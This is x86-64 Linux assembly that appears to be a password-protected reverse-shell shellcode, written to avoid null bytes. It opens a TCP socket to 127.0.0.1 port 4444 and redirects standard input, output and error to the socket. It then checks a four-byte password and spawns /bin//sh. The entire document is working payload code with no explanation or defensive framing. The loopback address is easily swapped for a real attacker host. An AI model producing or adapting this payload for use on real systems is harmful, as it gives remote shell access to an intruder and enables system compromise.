global _start


_start:


Create_Socket:

        ; sock = socket(AF_INET, SOCK_STREAM, 0)
        ; AF_INET = 2
        ; SOCK_STREAM = 1
        ; syscall number 41


        mov al, 41
        mov dil, 2
        mov sil, 1
        xor rdx, rdx
        syscall

        ; copy socket descriptor to rdi for future use

        mov rdi, rax

Socket_Struct:

        ; server.sin_family = AF_INET
        ; server.sin_port = htons(PORT)
        ; server.sin_addr.s_addr = inet_addr("127.0.0.1")
        ; bzero(&server.sin_zero, 8)

        xor rax, rax

        push rax

        mov dword [rsp-4], 0x0100007f ; Provide no null ip address to avoid nulls
        mov word [rsp-6], 0x5c11
        mov byte [rsp-8], 0x2
        sub rsp, 8

Socket_Connect:

        ; connect(sock, (struct sockaddr *)&server, sockaddr_len)

        mov al, 42
        mov rsi, rsp
        mov dl, 16
        syscall

Socket_dup2:

        ; dup2 (new, old)

        mov al, 33
        xor rsi, rsi
        syscall

        mov al, 33
        add rsi, 1
        syscall

        mov al, 33
        add rsi, 1
        syscall

Password:

        mov ebx, 0x6e616873   ; Password value shan
        ;read syscall and check for password read(client, *buf, 4)

        mov rsi, rsp
        xor eax, eax
        syscall

        cmp dword [rsp], ebx
        jnz Exit


Shell_Execve:

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall

Exit:
